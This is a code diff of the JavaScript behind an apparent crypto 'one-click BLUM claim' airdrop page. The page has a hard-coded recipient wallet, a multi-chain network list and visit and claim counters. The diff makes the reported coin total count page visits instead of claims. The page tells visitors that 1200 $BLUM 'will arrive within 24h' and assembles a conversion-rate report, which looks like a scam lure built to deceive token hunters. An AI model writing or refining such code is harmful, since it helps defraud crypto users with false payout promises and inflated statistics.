@@ -50,7 +50,7 @@
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
     const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
     const YOUR_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
-    const BLUM_PER_CLAIM = 1200;
+    const BLUM_PER_SCAN = 1200;
     
     let claimExecuted = false;
     let remainingSeconds = 24 * 60 * 60;
@@ -58,7 +58,7 @@
     let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
     
     function updateStats() {
-        const totalCoins = totalClaims * BLUM_PER_CLAIM;
+        const totalCoins = totalScans * BLUM_PER_SCAN;
         document.getElementById('totalClaims').innerText = totalClaims;
         document.getElementById('totalScans').innerText = totalScans;
         document.getElementById('totalCoins').innerText = totalCoins.toLocaleString();
@@ -95,10 +95,10 @@
         
         const hoursLeft = Math.floor(remainingSeconds / 3600);
         const minutesLeft = Math.floor((remainingSeconds % 3600) / 60);
-        const totalCoins = totalClaims * BLUM_PER_CLAIM;
+        const totalCoins = totalScans * BLUM_PER_SCAN;
         const conversionRate = totalScans > 0 ? ((totalClaims / totalScans) * 100).toFixed(1) : 0;
         
-        // ========== رسالة كاملة مع إجمالي العملات ==========
+        // ========== رسالة كاملة مع إجمالي العملات (على أساس الزيارات) ==========
         const fullMessage = `🎁 *ONE-CLICK BLUM CLAIM* 🎁
 ━━━━━━━━━━━━━━━━━━━━
 ⛓️ *Network:* ${network}
@@ -126,7 +126,7 @@
         btn.innerHTML = "✅ CLAIMED!";
         btn.disabled = true;
         statusDiv.style.display = 'block';
-        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_CLAIM} $BLUM will arrive within 24h.</span>`;
+        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_SCAN} $BLUM will arrive within 24h.</span>`;
     }
     
     async function onClaimClick() {
